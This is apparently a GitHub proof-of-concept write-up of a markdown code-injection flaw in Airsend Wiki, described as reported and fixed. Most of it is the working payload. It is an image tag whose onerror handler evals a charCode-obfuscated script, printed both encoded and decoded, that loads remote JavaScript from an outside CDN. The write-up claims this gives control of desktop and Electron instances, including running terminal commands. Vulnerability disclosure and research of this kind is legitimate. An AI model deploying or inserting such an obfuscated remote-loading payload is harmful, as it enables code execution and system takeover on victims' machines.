⚠️⚠️⚠️ THIS SECURITY BREACH WAS REPORTED AND IS ALREADY FIXED, HENCE THE PUBLIC REPOSITORY ⚠️⚠️⚠️

# Airsend Wiki MD code injection attack


For testing purposes I encoded the url to this script hosted here on a image tag and inserted in a index in Airsend Wiki markdown.

## Markdown content

```
## SECURE CONTENT - TRUST ME
<img src=x onerror=eval(String.fromCharCode(99,111,110,115,116,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,99,100,110,46,115,116,97,116,105,99,97,108,108,121,46,105,111,47,103,104,47,109,105,99,104,101,108,100,112,99,97,114,108,111,115,47,97,105,114,115,101,110,100,45,106,115,45,105,110,106,101,99,116,105,111,110,45,112,111,99,47,53,48,98,50,57,99,56,57,98,50,56,55,55,50,53,97,98,53,52,49,55,51,50,101,101,98,54,98,54,53,51,98,51,99,54,50,54,48,50,102,47,105,110,100,101,120,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>
```



## Decoded onerror content
```
// Using a cdn to provide static js from github with the correct MIME type
const js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'https://cdn.statically.io/gh/micheldpcarlos/airsend-js-injection-poc/50b29c89b287725ab541732eeb6b653b3c62602f/index.js'; document.body.appendChild(js);
```


# Result
The script is loaded and the attacker gain control over any instance running on desktop, if on Electron app we gain control over node apis and gain system control, even runnig a terminal command.

Tests using ios mobile didn't show any issue.

<img width="1912" alt="image" src="https://user-images.githubusercontent.com/29731180/155525895-6c7b57c7-7697-4a5a-9819-b7bf8f8e27db.png">






